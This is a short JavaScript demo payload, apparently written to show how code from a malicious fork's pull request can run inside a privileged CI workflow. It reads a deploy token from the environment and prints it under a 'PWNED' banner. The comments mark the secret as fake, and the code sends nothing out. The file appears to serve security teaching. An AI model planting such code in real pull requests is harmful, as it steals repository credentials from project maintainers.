// ATTACKER PAYLOAD (demo only)
//
// This is the code a malicious fork sneaks into a pull request. 
// A real payload would quietly ship those secrets to the attacker;
// this one just proves it had access.
//
// Secret value is fake, this really is for demonstration purposes only.

const token = process.env.FAKE_DEPLOY_TOKEN || "(no token in env)";

console.log("\n==================== PWNED ====================");
console.log("Attacker code is running inside the privileged workflow.");
console.log("Captured secret from the base repo:", token);
console.log("==============================================\n");
